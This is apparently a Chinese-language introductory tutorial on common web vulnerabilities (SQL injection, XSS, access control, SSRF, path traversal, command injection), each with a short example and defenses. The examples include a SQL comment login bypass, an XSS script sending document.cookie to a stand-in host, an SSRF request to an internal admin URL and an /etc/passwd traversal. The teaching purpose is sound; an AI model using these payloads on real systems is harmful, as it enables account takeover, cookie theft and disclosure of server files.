# SQL 注入漏洞

SQL 注入漏洞是一种最常见的、危害较大的应用安全漏洞。通过这种漏洞攻击者可以利用应用的数据库查询获取到他们本不应该获取到的数据。比如其他用户的数据（他人的密码信息、敏感个人信息）或者只有应用自身才能访问的数据（数据库名、表名）。在大多数情况下，攻击者甚至可以修改数据或者删除数据，这对应用会造成长久的破坏。在某些特定情况下，攻击者能够通过 SQL 注入漏洞进一步渗透，从而获取服务器或者基础架构设置的权限。

## 举一个例子

以一个用户登录处为例，假如登录处存在 SQL 注入漏洞。已最简单的用户登陆场景为例，假如一个用户名为 `wine` 的用户登录，他的密码是 `winer`。那么当他输入用户名、密码登录的时候，后端执行的逻辑是查询数据库中是否存在对应的用户名以及密码的账户。执行的 SQL 语句类似如下：

```
SELECT * FROM users WHERE username = 'wine' AND password = 'winer'
```

但是如果登录处存在 SQL 注入漏洞，攻击者可以通过注释符号 `--` 实现登录任意用户账号。通过注释符号可以屏蔽掉密码字段的检查。比如提交用户名为 `administrator'--` 以及空密码，其实现的数据库查询语句类似如下:

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

这个查询语句通过注释符号注释了后面的语句，因此攻击者就可以成功登录。当然这里只是一个比较极端的例子，在现实的应用场景一定是比这个场景复杂很多。

## 如何防御

SQL 注入漏洞形成的根本原因是开发者对用户提交的参数没有做任何的过滤或者处理（或者不充分）。过滤是应对 SQL 注入的一种方式，但这不是一种好的方式，可能会存在绕过。最好的防御 SQL 注入漏洞的方式是使用预编译的方式执行 SQL 语句，绝对不要直接拼接 SQL 语句！！！

# XSS 漏洞

XSS 的英文全称是 Cross-site scripting，一般也可以称为跨站脚本攻击。这种漏洞可以绕过同源策略的限制，可以让攻击者伪装成受害者执行他可以执行的任何操作。如果受害者是一个高权限用户，那么攻击者可以执行更高阶的操作并且获取更多的数据。

## 举一个例子

假设一个应用 `http://example.com/app?name=wine`，参数 `name` 存在 XSS 漏洞。假设攻击者传入 `name` 参数为 `<script>var r = new XMLHttpRequest();r.open('GET','http://evail.com/'+document.cookie);r.send()</script>`并且受害者访问这个恶意链接就会将他的 cookie 信息传输到 `http://evail.com`，攻击者即可以在后端获取用户的 cookie 信息。

## 如何防御

XSS 的防御手段需要结合具体的应用场景，这样既避免影响应用的正常使用，也可以尽可能的防御漏洞的利用。主要防护手段可以结合以下几种：

* 对输入做过滤：尽可能的对输入做过滤，过滤需要结合具体应用实现。
* 对数据输出做编码：当用户的输入参数会输出到请求响应中，应该对输出做编码，避免恶意参数被直接解释执行，通常需要结合 HTML、URL、JavaScript 编码。这一点目前大多数成熟的前端框架已经做得比较完善。
* 使用合适的响应头：如果响应中不包含 HTML 或者 JavaScript，可以通过 `Content-Type` 属性来进行限制。
* CSP 策略：作为纵深防御，可以通过结合 CSP 策略来限制 XSS 漏洞的影响。

# 越权漏洞

越权漏洞是常见应用安全漏洞之一，其危害性以及影响范围都比较大。这种漏洞通常是由于应用没有做好充分的权限校验（或没有做），从而攻击者可以通过低权限账户通过绕过权限检查从而使用高权限账户功能，或者能够访问其他用户的数据。

## 举一个例子

假设一个应用分为普通用户和管理员两种用户角色。只有管理员用户有添加新用户的权限，但是应用并没有在后端校验用户的身份，仅仅是在前端不向普通用户展示添加用户的菜单。攻击者如果知道了添加用户的后端接口，则可以通过直接调用这个接口达到添加用户的目的。

## 如何防御

* 做好接口的接口鉴权，对于任意接口都需要做鉴权操作
* 前后端都应该做好校验，不能依赖前端做校验或通过前端隐藏菜单来进行权限控制
* 敏感的操作可以添加天赐验证
* 对于和用户关联的信息要做到随机性以及不可暴力猜解

# 服务端请求伪造漏洞

服务端请求伪造即 Server-side request forgery(SSRF)，能够允许攻击者通过利用服务端应用向任意域名创建访问请求。通过 SSRF 漏洞，通常可以未授权访问组织内部数据或者是有漏洞的应用。

## 举一个例子

假设存在一个互联网应用有一个 `stock` 接口：

```
POST /product/stock
Content-Type: application/x-wwww-form-urlencoded

stockApi=http://example.com/product/stock/check?productId=123
````

这个接口向另外一个特定的接口创建请求用户获取指定 `productId` 的状态。但是假设尝试通过 `stockApi` 去访问内网应用：

```
POST /product/stock
Content-Type: application/x-wwww-form-urlencoded

stockApi=http://192.168.0.1/admin
````

由于后端没有对访问域名做任何的限制，就能够允许攻击者访问内网应用。

## 如何防御

* 应该尽可能严格地限制接口访问的协议，以及域名
* 限制方式应该尽量使用白名单
* 避免跟随 30X 跳转

# 目录穿越漏洞

目录穿越漏洞能否允许攻击者访问存储在文件系统中的任意文件或者目录，尤其是应用程序源代码、配置文件、以及重要系统文件信息。

## 举一个例子

假设一个应用存在一个读取图片的接口：

```
http://example.com/loadImage?filename=example.png
```

如果后端对于传入的 `filename` 参数没有做任何的校验和过滤，通过访问 `http://example.com/loadImage?filename=../../../etc/passwd` 就有可能访问到服务器的敏感文件信息。

## 如何防御

* 对于用户的输入需要做严格校验，尽量使用白名单的方式校验
* 对于文件路径要做归一化处理

# 命令注入漏洞

命令注入漏洞能够允许攻击者在应用运行的服务器上执行任意系统命令。这种漏洞的危害性极大，并有可能导致能够获取服务器的控制权限。这种漏洞通常是因为开发者直接拼接系统命令来执行或者使用类似于 eval 的函数直接执行参数。

## 举一个例子

假设一个应用存在提供网络探测的功能，用户可以通过 ping 去检测网络状态。假如开发者对于传入的命令没有做任何的过滤限制，那么攻击者就可以利用此来执行任意命令。

## 如何防御

* 对于输入参数严格过滤，仅允许需要使用的命令参数
* 做好命令特殊参数的校验和过滤
* 通过成熟的库来执行操作，避免直接拼接命令调用系统功能


这里只是简单地罗列了一些最常见的应用安全漏洞，欢迎大家拍砖交流。
